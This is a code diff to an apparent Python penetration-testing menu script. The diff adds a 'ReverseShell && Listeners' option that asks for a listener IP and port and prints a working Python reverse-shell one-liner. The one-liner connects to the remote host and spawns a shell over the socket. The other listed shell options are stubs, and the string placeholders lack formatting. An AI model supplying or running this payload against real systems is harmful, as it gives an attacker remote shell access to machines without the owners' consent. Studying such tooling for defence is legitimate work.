@@ -196,6 +196,28 @@ def wpscan_tool():
 
     wpscan_tool()
 
+
+def shell():
+    print("ReverseShell && Listeners")
+    target = input("Enter Listener IP: (like 192.168.1.1): ")
+    port = input("Listner POrt: ")
+
+    print("\nChoose scan type:")
+    print("1. Python RevShell")
+    print("2. Perl RevShell") 
+    print("3. PHP RevShell ")
+    print("4. Find services -sV")
+    print("5. Find OS -O")
+
+    choice = input("\nEnter number (1-5): ")
+
+    if choice == "1":
+        print("""export RHOST="{target}";export RPORT={port};python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'""")
+    else:
+        print("Wrong choice!")
+        exit()
+
+
 def manu():
     print(Back.GREEN + "1: Nmap"+ Style.RESET_ALL)
     print(Back.GREEN + "2: Nmap Scan Ai Analyzer" + Style.RESET_ALL )
@@ -211,5 +233,8 @@ def manu():
         ffuf_scanner()  
     elif choice == 4:
         wpscan_tool()
+    elif choice == 5:
+        shell()
+    
 
 manu()
